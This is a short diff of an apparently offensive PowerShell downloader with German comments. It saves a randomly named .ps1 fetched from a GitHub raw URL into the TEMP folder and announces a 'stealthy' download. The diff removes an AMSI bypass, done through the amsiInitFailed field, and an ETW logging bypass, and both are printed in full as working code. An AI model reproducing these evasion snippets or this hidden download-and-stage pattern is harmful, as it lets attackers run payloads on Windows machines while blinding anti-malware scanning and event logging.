@@ -10,13 +10,7 @@ $Url = "https://raw.githubusercontent.com/benwurg-ui/234879667852356789234562364
 $RandomName = [System.Guid]::NewGuid().ToString() + ".ps1"
 $ScriptPath = Join-Path $env:TEMP $RandomName
 
-# AMSI-Bypass (um Anti-Malware Scan Interface zu deaktivieren)
-[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
 
-# ETW-Bypass (Event Tracing for Windows – blockt Logging)
-$etwProvider = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').GetValue($null)
-$eventProvider = New-Object 'System.Diagnostics.Eventing.EventProvider' -ArgumentList @([Guid]::NewGuid())
-$etwProvider.SetValue($null, $eventProvider)
 
 try {
     Write-Host "[+] Starte stealthy Download von $Url..." -ForegroundColor Cyan
